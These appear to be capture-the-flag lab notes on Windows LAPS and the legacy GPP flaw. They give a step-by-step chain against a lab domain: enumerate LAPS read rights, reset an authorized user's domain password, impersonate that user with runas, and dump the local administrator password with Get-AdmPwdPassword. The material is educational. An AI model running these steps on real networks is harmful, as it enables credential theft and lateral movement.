# LAB — Local Administrator Password Solution (LAPS)

> [!abstract] TL;DR
> **LAPS** auto-manages a **unique, rotating local Administrator password per computer**, storing it in **cleartext** in the AD attribute **`ms-mcs-AdmPwd`**. Only delegated groups can read it. **LAPS abuse is a permissions problem:** find which group/account has read rights → compromise/impersonate that account → read the password with `Get-AdmPwdPassword`. LAPS replaced the broken **GPP** method (passwords encrypted in SYSVOL with a public AES key).

---

## Background: GPP → LAPS

### Group Policy Preferences (GPP) — the broken legacy approach

Every Windows OS has a built-in local **Administrator** account. Changing its password across a large fleet manually is impractical, so Microsoft introduced **GPP** to manage local admin passwords centrally.

The flaw: GPP stored the password in **XML files in the SYSVOL share**, encrypted with **AES-256**. SYSVOL is readable by all authenticated domain users — and Microsoft **published the static 32-byte AES private key on MSDN**. So any domain user could read the XML and decrypt the embedded admin password.

- Tools: **[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)** and `gpp-decrypt` use the static key to decrypt automatically.
- Microsoft **deprecated** this in **2015**, removing the ability to store encrypted passwords in SYSVOL, and introduced **LAPS** as the replacement.

### LAPS — the managed approach

LAPS manages randomized local admin passwords **individually per computer**, storing them in access-controlled AD attributes:

| Attribute | Meaning |
|---|---|
| `ms-mcs-AdmPwd` | Local Administrator password, stored in **cleartext** |
| `ms-mcs-AdmPwdExpirationTime` | Timestamp when the password auto-rotates |

LAPS uses the DLL **`AdmPwd.dll`** to rotate the password and track expiration.

> [!note] Legacy vs modern attributes
> The lab uses **legacy** LAPS attributes (`ms-mcs-AdmPwd`, `ms-mcs-AdmPwdExpirationTime`). Newer **Windows LAPS** uses different attributes such as `msLAPS-Password` or `msLAPS-EncryptedPassword`.
> In real production, LAPS is relatively uncommon and enabled only on specific machines — but it shows up often in CTF labs and legacy networks.

> [!warning] The password is cleartext but access-controlled
> `ms-mcs-AdmPwd` is cleartext, but standard domain users are **not** granted read permission by default. Only designated/delegated groups can read it. If you compromise an account in such a group, you can read it directly. LAPS also does **not** reveal the user's domain password or the `krbtgt` hash — only a per-computer local Administrator password.

## Attack Chain (summary)

`Enumerate LAPS → find password-read permissions → identify authorized group/account → identify target computer → compromise that account → retrieve password`

---

## Step 1 — Check Whether LAPS Is Installed

Check for the client-side extension DLL:

```
dir "C:\Program Files\LAPS\CSE"
```

If **`AdmPwd.dll`** is present, LAPS is installed:

```shell-session
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Directory of C:\Program Files\LAPS\CSE

05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
```

## Step 2 — List the LAPS Cmdlets

Switch to PowerShell, then:

```
Get-Command *AdmPwd*
```


## Step 3 — Find Who Has "All Extended Rights" (password read)

Find which OU grants extended rights to read the LAPS password. Use `-Identity *` to list all OUs; here the target OU is `THMorg`:

```
Find-AdmPwdExtendedRights -Identity THMorg
```

```shell-session
ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}
```

→ The **`THMGroupReader`** group in `THMorg` has read access to LAPS.

## Step 4 — Identify Group Members

```
net groups "THMGroupReader"
```

```shell-session
PS C:\Users\thm> net groups "THMGroupReader"
Group name     THMGroupReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.
```

→ **`bk-admin`** is a member of `THMGroupReader` and can read the LAPS password. (You can also inspect a specific user with `net user <name>` to confirm group memberships.)

## Step 5 — Compromise / Impersonate the Authorized User

To read the password you must become `bk-admin`. Open **cmd as administrator** and reset the user's password (fails with `Access is denied` if cmd is not elevated):

```
net user <username> <new password> /domain
net user bk-admin Password@123 /domain
```

Then log in (impersonate) as that user:

```
runas /user:bk-admin cmd.exe
```

Enter the new password — a new terminal opens running under `bk-admin`.

## Step 6 — Retrieve the LAPS Password

In the new `bk-admin` terminal, switch to PowerShell and read the cleartext local admin password for the target computer:

```
Get-AdmPwdPassword -ComputerName creds-harvestin
```

```shell-session
ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...
```

- **ComputerName** — target computer
- **Password** — managed local Administrator password (if authorized to read)
- **ExpirationTimestamp** — when it rotates

Once harvested, use this local admin password to authenticate, move laterally, and continue post-exploitation.

> [!tip] Real-world note
> LAPS is enabled on specific machines only, so you must enumerate to find both the **right target computer** and the **right authorized account**. Helper scripts exist — the lab includes **[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)** in `C:\Tool`.

> [!note] Displayed `FakePassword`
> `FakePassword` in the lab output is example material, not necessarily the live value in your session.

## Key Concept to Remember

LAPS abuse is primarily a **permissions problem**. The password may be securely managed and rotated, but an account with **excessive read permissions** can still retrieve it. GPP's flaw was public-key decryption of SYSVOL XML; LAPS's risk is over-delegated read rights on `ms-mcs-AdmPwd`.
